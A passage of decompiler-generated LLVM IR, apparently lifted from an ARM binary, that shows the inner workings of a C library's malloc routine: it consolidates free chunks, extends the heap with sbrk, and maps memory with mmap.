  store i32 %v2_28e9c, i32* %ip.global-to-local, align 4
  %v1_28ea0 = add i32 %v3_28e68, 12
  %v2_28ea0 = inttoptr i32 %v1_28ea0 to i32*
  %v3_28ea0 = load i32, i32* %v2_28ea0, align 4
  store i32 %v3_28ea0, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_28e9c, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_28e94
  %v6_28ea8 = add i32 %v1_28e98, %v3_28e68
  store i32 %v6_28ea8, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_28e94, %bb143
  %v2_28eac = add i32 %v3_28ea0, 8
  %v3_28eac = inttoptr i32 %v2_28eac to i32*
  store i32 %v0_28eac, i32* %v3_28eac, align 4
  %v0_28eb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_28eb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_28eb0 = add i32 %v1_28eb0, 12
  %v3_28eb0 = inttoptr i32 %v2_28eb0 to i32*
  store i32 %v0_28eb0, i32* %v3_28eb0, align 4
  %v4_28eb4 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_28d90_crit_edge, label %dec_label_pc_28ec0

.dec_label_pc_28d90_crit_edge:                    ; preds = %bb144
  %v5_28eb4 = add i32 %v4_28eb4, 8
  store i32 %v5_28eb4, i32* %r4.global-to-local, align 4
  %v4_28eb8 = load i32, i32* %r2.global-to-local, align 4
  %v5_28eb8 = add i32 %v4_28eb8, 4
  %v6_28eb8 = inttoptr i32 %v5_28eb8 to i32*
  %v7_28eb8 = load i32, i32* %v6_28eb8, align 4
  store i32 %v7_28eb8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28d90

dec_label_pc_28ec0:                               ; preds = %bb144
  %v1_28ec0 = load i32, i32* @sl, align 4
  %v2_28ec0 = add i32 %v1_28ec0, %v4_28eb4
  store i32 %v2_28ec0, i32* %r1.global-to-local, align 4
  %v1_28ec8 = load i32, i32* @r6, align 4
  %v2_28ec8 = add i32 %v1_28ec8, 8
  %v3_28ec8 = inttoptr i32 %v2_28ec8 to i32*
  store i32 %v2_28ec0, i32* %v3_28ec8, align 4
  %v0_28ecc = load i32, i32* %r1.global-to-local, align 4
  %v1_28ecc = load i32, i32* @r6, align 4
  %v2_28ecc = add i32 %v1_28ecc, 12
  %v3_28ecc = inttoptr i32 %v2_28ecc to i32*
  store i32 %v0_28ecc, i32* %v3_28ecc, align 4
  %v0_28ed0 = load i32, i32* @r6, align 4
  %v1_28ed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_28ed0 = add i32 %v1_28ed0, 8
  %v3_28ed0 = inttoptr i32 %v2_28ed0 to i32*
  store i32 %v0_28ed0, i32* %v3_28ed0, align 4
  %v0_28ed4 = load i32, i32* @r6, align 4
  %v1_28ed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_28ed4 = add i32 %v1_28ed4, 12
  %v3_28ed4 = inttoptr i32 %v2_28ed4 to i32*
  store i32 %v0_28ed4, i32* %v3_28ed4, align 4
  %tmp210 = icmp ult i32 %v1_28ec0, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_28ec0
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v8_28ee0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v8_28ee0, i32* %r3.global-to-local, align 4
  %v4_28ee4 = load i32, i32* %r1.global-to-local, align 4
  %v6_28ee4 = add i32 %v8_28ee0, 48
  %v7_28ee4 = inttoptr i32 %v6_28ee4 to i32*
  store i32 %v4_28ee4, i32* %v7_28ee4, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_28ec0, %bb145
  %v0_28ee8 = load i32, i32* @sl, align 4
  %v1_28ee8 = or i32 %v0_28ee8, 1
  store i32 %v1_28ee8, i32* %r2.global-to-local, align 4
  %v0_28eec = load i32, i32* %ip.global-to-local, align 4
  %v1_28eec = or i32 %v0_28eec, 1
  store i32 %v1_28eec, i32* %r3.global-to-local, align 4
  %v0_28ef0 = load i32, i32* @lr, align 4
  %v1_28ef0 = add i32 %v0_28ef0, 8
  store i32 %v1_28ef0, i32* %r4.global-to-local, align 4
  %v2_28ef4 = add i32 %v0_28ef0, 4
  %v3_28ef4 = inttoptr i32 %v2_28ef4 to i32*
  store i32 %v1_28ee8, i32* %v3_28ef4, align 4
  %v0_28ef8 = load i32, i32* %ip.global-to-local, align 4
  %v1_28ef8 = load i32, i32* %r1.global-to-local, align 4
  %v3_28ef8 = add i32 %v1_28ef8, %v0_28ef8
  %v4_28ef8 = inttoptr i32 %v3_28ef8 to i32*
  store i32 %v0_28ef8, i32* %v4_28ef8, align 4
  %v0_28efc = load i32, i32* %r3.global-to-local, align 4
  %v1_28efc = load i32, i32* %r1.global-to-local, align 4
  %v2_28efc = add i32 %v1_28efc, 4
  %v3_28efc = inttoptr i32 %v2_28efc to i32*
  store i32 %v0_28efc, i32* %v3_28efc, align 4
  br label %dec_label_pc_29350

dec_label_pc_28f04.loopexit:                      ; preds = %dec_label_pc_28e24
  br label %dec_label_pc_28f04

dec_label_pc_28f04:                               ; preds = %dec_label_pc_28f04.loopexit, %dec_label_pc_28b18, %dec_label_pc_28b20
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  %v4_28f0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_28f0c, i32* @r0, align 4
  %v1_28f10 = add i32 %v4_28f0c, 44
  %v2_28f10 = inttoptr i32 %v1_28f10 to i32*
  %v3_28f10 = load i32, i32* %v2_28f10, align 4
  store i32 %v3_28f10, i32* %ip.global-to-local, align 4
  %v1_28f14 = add i32 %v3_28f10, 4
  %v2_28f14 = inttoptr i32 %v1_28f14 to i32*
  %v3_28f14 = load i32, i32* %v2_28f14, align 4
  %v0_28f18 = load i32, i32* @sl, align 4
  %v1_28f18 = add i32 %v0_28f18, 16
  store i32 %v1_28f18, i32* %r1.global-to-local, align 4
  %v1_28f1c = and i32 %v3_28f14, -4
  store i32 %v1_28f1c, i32* %r3.global-to-local, align 4
  %v3_28f20 = icmp ult i32 %v1_28f1c, %v1_28f18
  br i1 %v3_28f20, label %dec_label_pc_28f50, label %dec_label_pc_28f2c

dec_label_pc_28f2c:                               ; preds = %dec_label_pc_28f04
  %v2_28f2c = sub i32 %v1_28f1c, %v0_28f18
  %v2_28f30 = add i32 %v0_28f18, %v3_28f10
  store i32 %v2_28f30, i32* %r1.global-to-local, align 4
  %v1_28f34 = or i32 %v2_28f2c, 1
  store i32 %v1_28f34, i32* %r3.global-to-local, align 4
  %v1_28f38 = or i32 %v0_28f18, 1
  store i32 %v1_28f38, i32* %r2.global-to-local, align 4
  %v1_28f3c = add i32 %v3_28f10, 8
  store i32 %v1_28f3c, i32* %r4.global-to-local, align 4
  store i32 %v1_28f38, i32* %v2_28f14, align 4
  %v0_28f44 = load i32, i32* %r1.global-to-local, align 4
  %v1_28f44 = load i32, i32* @r0, align 4
  %v2_28f44 = add i32 %v1_28f44, 44
  %v3_28f44 = inttoptr i32 %v2_28f44 to i32*
  store i32 %v0_28f44, i32* %v3_28f44, align 4
  %v0_28f48 = load i32, i32* %r3.global-to-local, align 4
  %v1_28f48 = load i32, i32* %r1.global-to-local, align 4
  %v2_28f48 = add i32 %v1_28f48, 4
  %v3_28f48 = inttoptr i32 %v2_28f48 to i32*
  store i32 %v0_28f48, i32* %v3_28f48, align 4
  br label %dec_label_pc_29350

dec_label_pc_28f50:                               ; preds = %dec_label_pc_28f04
  %v1_28f50 = inttoptr i32 %v4_28f0c to i32*
  %v2_28f50 = load i32, i32* %v1_28f50, align 4
  store i32 %v2_28f50, i32* %r3.global-to-local, align 4
  %v1_28f54 = and i32 %v2_28f50, 2
  store i32 %v1_28f54, i32* %ip.global-to-local, align 4
  %v2_28f54 = icmp eq i32 %v1_28f54, 0
  %v1_28f58 = add i32 %v4_28f0c, 860
  %v2_28f58 = inttoptr i32 %v1_28f58 to i32*
  %v3_28f58 = load i32, i32* %v2_28f58, align 4
  store i32 %v3_28f58, i32* %r1.global-to-local, align 4
  br i1 %v2_28f54, label %dec_label_pc_28f70, label %dec_label_pc_28f60

dec_label_pc_28f60:                               ; preds = %dec_label_pc_28f50
  %v0_28f60 = call i32 @__malloc_consolidate()
  %v0_28f64 = load i32, i32* @sl, align 4
  %v1_28f64 = add i32 %v0_28f64, -7
  store i32 %v1_28f64, i32* %r0.global-to-local, align 4
  %v1_28f68 = call i32 @malloc(i32 %v1_28f64)
  store i32 %v1_28f68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2934c

dec_label_pc_28f70:                               ; preds = %dec_label_pc_28f50
  %v1_28f70 = add i32 %v4_28f0c, 844
  %v2_28f70 = inttoptr i32 %v1_28f70 to i32*
  %v3_28f70 = load i32, i32* %v2_28f70, align 4
  store i32 %v3_28f70, i32* %r3.global-to-local, align 4
  %v3_28f74 = icmp ult i32 %v0_28f18, %v3_28f70
  %v1_28f78 = add i32 %v3_28f58, -1
  store i32 %v1_28f78, i32* %sb.global-to-local, align 4
  br i1 %v3_28f74, label %dec_label_pc_2904c, label %dec_label_pc_28f80

dec_label_pc_28f80:                               ; preds = %dec_label_pc_28f70
  %v1_28f80 = add i32 %v4_28f0c, 852
  %v2_28f80 = inttoptr i32 %v1_28f80 to i32*
  %v3_28f80 = load i32, i32* %v2_28f80, align 4
  store i32 %v3_28f80, i32* %r2.global-to-local, align 4
  %v1_28f84 = add i32 %v4_28f0c, 848
  %v2_28f84 = inttoptr i32 %v1_28f84 to i32*
  %v3_28f84 = load i32, i32* %v2_28f84, align 4
  store i32 %v3_28f84, i32* %r3.global-to-local, align 4
  %v6_28f8c = icmp slt i32 %v3_28f84, %v3_28f80
  br i1 %v6_28f8c, label %dec_label_pc_28f90, label %dec_label_pc_2904c

dec_label_pc_28f90:                               ; preds = %dec_label_pc_28f80
  %v1_28f90 = add i32 %v0_28f18, 10
  %v2_28f94 = add i32 %v1_28f90, %v3_28f58
  store i32 %v2_28f94, i32* %r3.global-to-local, align 4
  %v2_28f98 = sub i32 0, %v3_28f58
  %v3_28f98 = and i32 %v2_28f94, %v2_28f98
  store i32 %v3_28f98, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_28f98, %v0_28f18
  br i1 %tmp211, label %dec_label_pc_28fa4, label %dec_label_pc_2904c

dec_label_pc_28fa4:                               ; preds = %dec_label_pc_28f90
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_28f98, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_28fbc = call i32 @mmap(i32 0, i32 %v3_28f98, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_28fbc, i32* %r0.global-to-local, align 4
  %v7_28fc0 = icmp eq i32 %v6_28fbc, -1
  br i1 %v7_28fc0, label %dec_label_pc_28fa4.dec_label_pc_2904c_crit_edge, label %dec_label_pc_28fc8

dec_label_pc_28fa4.dec_label_pc_2904c_crit_edge:  ; preds = %dec_label_pc_28fa4
  %v1_29070.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_2904c

dec_label_pc_28fc8:                               ; preds = %dec_label_pc_28fa4
  %v1_28fc8 = urem i32 %v6_28fbc, 8
  store i32 %v1_28fc8, i32* %r2.global-to-local, align 4
  %v2_28fc8 = icmp eq i32 %v1_28fc8, 0
  br i1 %v2_28fc8, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_28fc8
  %v2_28fcc = sub nsw i32 8, %v1_28fc8
  store i32 %v2_28fcc, i32* %r3.global-to-local, align 4
  %v2_28fd0 = load i32, i32* @r4, align 4
  %v3_28fd0 = sub i32 %v2_28fd0, %v2_28fcc
  %v3_28fd4 = add i32 %v2_28fcc, %v6_28fbc
  store i32 %v3_28fd4, i32* %lr.global-to-local, align 4
  %v2_28fdc = or i32 %v3_28fd0, 2
  store i32 %v2_28fdc, i32* %r2.global-to-local, align 4
  %v5_28fe4 = inttoptr i32 %v3_28fd4 to i32*
  store i32 %v2_28fcc, i32* %v5_28fe4, align 4
  %v1_28fe8 = load i32, i32* %r2.global-to-local, align 4
  %v2_28fe8 = load i32, i32* %lr.global-to-local, align 4
  %v3_28fe8 = add i32 %v2_28fe8, 4
  %v4_28fe8 = inttoptr i32 %v3_28fe8 to i32*
  store i32 %v1_28fe8, i32* %v4_28fe8, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_28fc8
  store i32 %v6_28fbc, i32* %lr.global-to-local, align 4
  %v1_28fe047 = load i32, i32* @r4, align 4
  %v2_28fe048 = or i32 %v1_28fe047, 2
  store i32 %v2_28fe048, i32* %r3.global-to-local, align 4
  %v3_28fec = inttoptr i32 %v6_28fbc to i32*
  store i32 0, i32* %v3_28fec, align 4
  %v1_28ff0 = load i32, i32* %r3.global-to-local, align 4
  %v2_28ff0 = load i32, i32* %lr.global-to-local, align 4
  %v3_28ff0 = add i32 %v2_28ff0, 4
  %v4_28ff0 = inttoptr i32 %v3_28ff0 to i32*
  store i32 %v1_28ff0, i32* %v4_28ff0, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  %v4_28ffc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_28ffc, i32* %ip.global-to-local, align 4
  %v1_29000 = add i32 %v4_28ffc, 848
  %v2_29000 = inttoptr i32 %v1_29000 to i32*
  %v3_29000 = load i32, i32* %v2_29000, align 4
  store i32 %v3_29000, i32* %r3.global-to-local, align 4
  %v1_29004 = add i32 %v4_28ffc, 856
  %v2_29004 = inttoptr i32 %v1_29004 to i32*
  %v3_29004 = load i32, i32* %v2_29004, align 4
  store i32 %v3_29004, i32* %r2.global-to-local, align 4
  %v1_29008 = add i32 %v3_29000, 1
  store i32 %v1_29008, i32* %r3.global-to-local, align 4
  %v7_29010 = icmp sgt i32 %v1_29008, %v3_29004
  br i1 %v7_29010, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_29008, i32* %v2_29004, align 4
  %v0_29014.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_29014.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_29014 = phi i32 [ %v4_28ffc, %.thread27 ], [ %v1_29014.pre, %bb147 ]
  %v0_29014 = phi i32 [ %v1_29008, %.thread27 ], [ %v0_29014.pre, %bb147 ]
  %v2_29014 = add i32 %v1_29014, 848
  %v3_29014 = inttoptr i32 %v2_29014 to i32*
  store i32 %v0_29014, i32* %v3_29014, align 4
  %v0_29018 = load i32, i32* %ip.global-to-local, align 4
  %v1_29018 = add i32 %v0_29018, 868
  %v2_29018 = inttoptr i32 %v1_29018 to i32*
  %v3_29018 = load i32, i32* %v2_29018, align 4
  store i32 %v3_29018, i32* %r3.global-to-local, align 4
  %v1_2901c = add i32 %v0_29018, 880
  %v2_2901c = inttoptr i32 %v1_2901c to i32*
  %v3_2901c = load i32, i32* %v2_2901c, align 4
  store i32 %v3_2901c, i32* %r2.global-to-local, align 4
  %v0_29020 = load i32, i32* @r4, align 4
  %v2_29020 = add i32 %v0_29020, %v3_29018
  store i32 %v2_29020, i32* %r1.global-to-local, align 4
  %v1_29024 = add i32 %v0_29018, 872
  %v2_29024 = inttoptr i32 %v1_29024 to i32*
  %v3_29024 = load i32, i32* %v2_29024, align 4
  store i32 %v3_29024, i32* %r3.global-to-local, align 4
  %v1_2902c = add i32 %v0_29018, 884
  %v2_2902c = inttoptr i32 %v1_2902c to i32*
  %v3_2902c = load i32, i32* %v2_2902c, align 4
  store i32 %v3_2902c, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_29020, %v3_2901c
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_29020, i32* %v2_2901c, align 4
  %v0_29034.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_29034.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_29034 = phi i32 [ %v0_29018, %bb148 ], [ %v1_29034.pre, %bb149 ]
  %v0_29034 = phi i32 [ %v2_29020, %bb148 ], [ %v0_29034.pre, %bb149 ]
  %v2_29034 = add i32 %v1_29034, 868
  %v3_29034 = inttoptr i32 %v2_29034 to i32*
  store i32 %v0_29034, i32* %v3_29034, align 4
  %v0_29038 = load i32, i32* %r1.global-to-local, align 4
  %v1_29038 = load i32, i32* %r3.global-to-local, align 4
  %v2_29038 = add i32 %v1_29038, %v0_29038
  store i32 %v2_29038, i32* %r1.global-to-local, align 4
  %v1_2903c = load i32, i32* %r2.global-to-local, align 4
  %v0_29040 = load i32, i32* %lr.global-to-local, align 4
  %v1_29040 = add i32 %v0_29040, 8
  store i32 %v1_29040, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_29038, %v1_2903c
  br i1 %tmp213, label %bb151, label %dec_label_pc_2934c

bb151:                                            ; preds = %bb150
  %v5_29044 = load i32, i32* %ip.global-to-local, align 4
  %v6_29044 = add i32 %v5_29044, 884
  %v7_29044 = inttoptr i32 %v6_29044 to i32*
  store i32 %v2_29038, i32* %v7_29044, align 4
  br label %dec_label_pc_2934c

dec_label_pc_2904c:                               ; preds = %dec_label_pc_28f90, %dec_label_pc_28f70, %dec_label_pc_28fa4.dec_label_pc_2904c_crit_edge, %dec_label_pc_28f80
  %v1_29070 = phi i32 [ %v1_29070.pre, %dec_label_pc_28fa4.dec_label_pc_2904c_crit_edge ], [ %v0_28f18, %dec_label_pc_28f80 ], [ %v0_28f18, %dec_label_pc_28f70 ], [ %v0_28f18, %dec_label_pc_28f90 ]
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  %v4_29054 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_29054, i32* %r3.global-to-local, align 4
  %v1_29058 = add i32 %v4_29054, 44
  %v2_29058 = inttoptr i32 %v1_29058 to i32*
  %v3_29058 = load i32, i32* %v2_29058, align 4
  store i32 %v3_29058, i32* %r0.global-to-local, align 4
  %v1_2905c = add i32 %v4_29054, 864
  %v2_2905c = inttoptr i32 %v1_2905c to i32*
  %v3_2905c = load i32, i32* %v2_2905c, align 4
  store i32 %v3_2905c, i32* %r2.global-to-local, align 4
  %v1_29060 = add i32 %v4_29054, 840
  %v2_29060 = inttoptr i32 %v1_29060 to i32*
  %v3_29060 = load i32, i32* %v2_29060, align 4
  store i32 %v3_29060, i32* %r3.global-to-local, align 4
  %v1_29064 = add i32 %v3_29058, 4
  %v2_29064 = inttoptr i32 %v1_29064 to i32*
  %v3_29064 = load i32, i32* %v2_29064, align 4
  store i32 %v3_29064, i32* %r1.global-to-local, align 4
  %v1_2906c = urem i32 %v3_2905c, 2
  %v2_2906c = icmp eq i32 %v1_2906c, 0
  %v1_29068 = add i32 %v1_29070, 16
  %v2_29070 = add i32 %v1_29068, %v3_29060
  store i32 %v2_29070, i32* %r3.global-to-local, align 4
  %v1_29074 = and i32 %v3_29064, -4
  store i32 %v1_29074, i32* @r8, align 4
  br i1 %v2_2906c, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_2904c
  %v3_29078 = sub i32 %v2_29070, %v1_29074
  store i32 %v3_29078, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_2904c, %bb152
  %v0_2907c = phi i32 [ %v2_29070, %dec_label_pc_2904c ], [ %v3_29078, %bb152 ]
  %v1_2907c = load i32, i32* %sb.global-to-local, align 4
  %v2_2907c = add i32 %v1_2907c, %v0_2907c
  store i32 %v2_2907c, i32* %r3.global-to-local, align 4
  %v1_29080 = sub i32 -1, %v1_2907c
  store i32 %v1_29080, i32* %fp.global-to-local, align 4
  %v2_29084 = and i32 %v2_2907c, %v1_29080
  store i32 %v2_29084, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_29084, 1
  br i1 %tmp154, label %dec_label_pc_290a8, label %dec_label_pc_29094

dec_label_pc_29094:                               ; preds = %bb153
  store i32 %v2_29084, i32* %r0.global-to-local, align 4
  %v1_29098 = call i32 @__GI_sbrk(i32 %v2_29084)
  store i32 %v1_29098, i32* %r0.global-to-local, align 4
  %v3_2909c = icmp eq i32 %v1_29098, -1
  store i32 %v1_29098, i32* @r4, align 4
  br i1 %v3_2909c, label %dec_label_pc_290a8, label %dec_label_pc_29114

dec_label_pc_290a8:                               ; preds = %dec_label_pc_29094, %bb153
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r1.global-to-local, align 4
  %v4_290b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_290b0, i32* %r6.global-to-local, align 4
  %v1_290b4 = add i32 %v4_290b0, 864
  %v2_290b4 = inttoptr i32 %v1_290b4 to i32*
  %v3_290b4 = load i32, i32* %v2_290b4, align 4
  store i32 %v3_290b4, i32* %r3.global-to-local, align 4
  %v1_290b8 = urem i32 %v3_290b4, 2
  %v2_290b8 = icmp eq i32 %v1_290b8, 0
  br i1 %v2_290b8, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_290a8
  %v1_290bc = load i32, i32* @r8, align 4
  %v2_290bc = load i32, i32* %sb.global-to-local, align 4
  %v3_290bc = add i32 %v2_290bc, %v1_290bc
  %v2_290c0 = load i32, i32* @r5, align 4
  %v3_290c0 = add i32 %v3_290bc, %v2_290c0
  store i32 %v3_290c0, i32* %r3.global-to-local, align 4
  %v2_290c4 = load i32, i32* %fp.global-to-local, align 4
  %v3_290c4 = and i32 %v2_290c4, %v3_290c0
  store i32 %v3_290c4, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_290a8
  %v0_290c8.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_290c8 = phi i32 [ %v0_290c8.pr, %.thread29thread-pre-split ], [ %v3_290c4, %bb155 ]
  %v2_290c8 = icmp ugt i32 %v0_290c8, 1048575
  br i1 %v2_290c8, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_290e0 = phi i32 [ %v0_290c8, %.thread29 ], [ 1048576, %bb156 ]
  %v1_290d0 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_290e0, %v1_290d0
  br i1 %tmp214, label %dec_label_pc_290d8, label %dec_label_pc_2933c

dec_label_pc_290d8:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_290e0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_290f4 = call i32 @mmap(i32 0, i32 %v0_290e0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_290f4, i32* %r0.global-to-local, align 4
  %v3_290f8 = icmp eq i32 %v6_290f4, -1
  %v8_290f8 = icmp eq i32 %v6_290f4, -1
  store i32 %v6_290f4, i32* @r4, align 4
  br i1 %v8_290f8, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_290d8
  %v1_29100 = load i32, i32* %r6.global-to-local, align 4
  %v2_29100 = add i32 %v1_29100, 864
  %v3_29100 = inttoptr i32 %v2_29100 to i32*
  %v4_29100 = load i32, i32* %v3_29100, align 4
  %v2_29104 = load i32, i32* @r5, align 4
  %v3_29104 = add i32 %v2_29104, %v6_290f4
  store i32 %v3_29104, i32* %r0.global-to-local, align 4
  %v2_29108 = and i32 %v4_29100, -2
  store i32 %v2_29108, i32* %r3.global-to-local, align 4
  store i32 %v2_29108, i32* %v3_29100, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_290d8, %bb158
  br i1 %v3_290f8, label %dec_label_pc_29114, label %dec_label_pc_29118

dec_label_pc_29114:                               ; preds = %.thread32, %dec_label_pc_29094
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29118

dec_label_pc_29118:                               ; preds = %.thread32, %dec_label_pc_29114
  %v0_29118 = load i32, i32* @r4, align 4
  %v7_29118 = icmp eq i32 %v0_29118, -1
  br i1 %v7_29118, label %dec_label_pc_2933c, label %dec_label_pc_29120

dec_label_pc_29120:                               ; preds = %dec_label_pc_29118
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v4_29128 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_29128, i32* %ip.global-to-local, align 4
  store i32 %v3_29058, i32* %r2.global-to-local, align 4
  %v1_29130 = add i32 %v4_29128, 872
  %v2_29130 = inttoptr i32 %v1_29130 to i32*
  %v3_29130 = load i32, i32* %v2_29130, align 4
  %v1_29134 = load i32, i32* @r8, align 4
  %v2_29134 = add i32 %v1_29134, %v3_29058
  store i32 %v2_29134, i32* %r1.global-to-local, align 4
  %v0_29138 = load i32, i32* @r5, align 4
  %v2_29138 = add i32 %v0_29138, %v3_29130
  store i32 %v2_29138, i32* %r3.global-to-local, align 4
  %v9_2913c = icmp eq i32 %v0_29118, %v2_29134
  br i1 %v9_2913c, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_29120
  store i32 %v2_29138, i32* %v2_29130, align 4
  br label %dec_label_pc_29158

bb159:                                            ; preds = %dec_label_pc_29120
  %v1_29140 = load i32, i32* %r0.global-to-local, align 4
  %v8_29140 = icmp eq i32 %v1_29140, -1
  store i32 %v2_29138, i32* %v2_29130, align 4
  br i1 %v8_29140, label %.thread34, label %dec_label_pc_29158

.thread34:                                        ; preds = %bb159
  %v1_29148 = load i32, i32* @r5, align 4
  %v2_29148 = load i32, i32* @r8, align 4
  %v3_29148 = add i32 %v2_29148, %v1_29148
  %v2_2914c = or i32 %v3_29148, 1
  store i32 %v2_2914c, i32* %r3.global-to-local, align 4
  %v2_29150 = load i32, i32* %r2.global-to-local, align 4
  %v3_29150 = add i32 %v2_29150, 4
  %v4_29150 = inttoptr i32 %v3_29150 to i32*
  store i32 %v2_2914c, i32* %v4_29150, align 4
  br label %dec_label_pc_292d0

dec_label_pc_29158:                               ; preds = %bb159, %.thread122
  %v0_2915c.pr = load i32, i32* @r8, align 4
  %v0_29158 = load i32, i32* %ip.global-to-local, align 4
  %v1_29158 = add i32 %v0_29158, 864
  %v2_29158 = inttoptr i32 %v1_29158 to i32*
  %v3_29158 = load i32, i32* %v2_29158, align 4
  store i32 %v3_29158, i32* %r2.global-to-local, align 4
  %v2_2915c = icmp eq i32 %v0_2915c.pr, 0
  br i1 %v2_2915c, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_29158
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_29158
  %v2_29164 = urem i32 %v3_29158, 2
  store i32 %v2_29164, i32* %r3.global-to-local, align 4
  %v2_29168 = icmp eq i32 %v2_29164, 0
  br i1 %v2_29168, label %.thread40, label %dec_label_pc_29170

dec_label_pc_29170:                               ; preds = %.thread36
  %v0_29170 = load i32, i32* @r4, align 4
  %v1_29170 = load i32, i32* %r1.global-to-local, align 4
  %v3_29170 = icmp ult i32 %v0_29170, %v1_29170
  br i1 %v3_29170, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_29170
  %v2_29174 = and i32 %v3_29158, -2
  store i32 %v2_29174, i32* %r3.global-to-local, align 4
  store i32 %v2_29174, i32* %v2_29158, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_29170, %.thread37, %.thread36, %bb160
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  %v4_29184 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_29184, i32* @r7, align 4
  %v1_29188 = add i32 %v4_29184, 864
  %v2_29188 = inttoptr i32 %v1_29188 to i32*
  %v3_29188 = load i32, i32* %v2_29188, align 4
  store i32 %v3_29188, i32* %r3.global-to-local, align 4
  %v1_2918c = urem i32 %v3_29188, 2
  store i32 %v1_2918c, i32* @r6, align 4
  %v2_2918c = icmp eq i32 %v1_2918c, 0
  br i1 %v2_2918c, label %dec_label_pc_29220, label %dec_label_pc_29194

dec_label_pc_29194:                               ; preds = %.thread40
  %v0_29194 = load i32, i32* @r8, align 4
  %v2_29194 = icmp eq i32 %v0_29194, 0
  br i1 %v2_29194, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_29194
